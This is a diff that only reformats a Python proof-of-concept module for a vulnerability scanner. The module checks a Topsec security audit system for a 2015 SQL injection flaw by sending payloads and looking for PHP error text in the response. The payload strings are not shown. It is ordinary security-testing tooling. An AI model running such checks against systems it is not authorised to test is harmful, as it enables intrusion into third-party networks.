@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import time
 
+
 class Vuln(ABVuln):
     vuln_id = 'TOPSEC_0032'  # 平台漏洞编号，留空
     name = '天融信网络卫士安全审计系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-08-20'  # 漏洞公布时间
     desc = '''
         天融信网络卫士安全审计系统存在SQL注入漏洞。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '天融信审计系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '09665c59-e705-4861-8d65-f4301619e349'
@@ -34,7 +36,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #Refer http://www.wooyun.org/bugs/wooyun-2015-0135532
+            # Refer http://www.wooyun.org/bugs/wooyun-2015-0135532
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = (
@@ -44,10 +46,10 @@ class Poc(ABPoc):
             for payload in payloads:
                 url = arg + payload
                 code, head, res, errcode, _url = hh.http(url)
-                m = re.findall('thrown in <b>(.*?)</b>',res)
+                m = re.findall('thrown in <b>(.*?)</b>', res)
                 # print m
-                if code == 200 and m: 
-                    #security_hole(url)
+                if code == 200 and m:
+                    # security_hole(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -56,6 +58,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
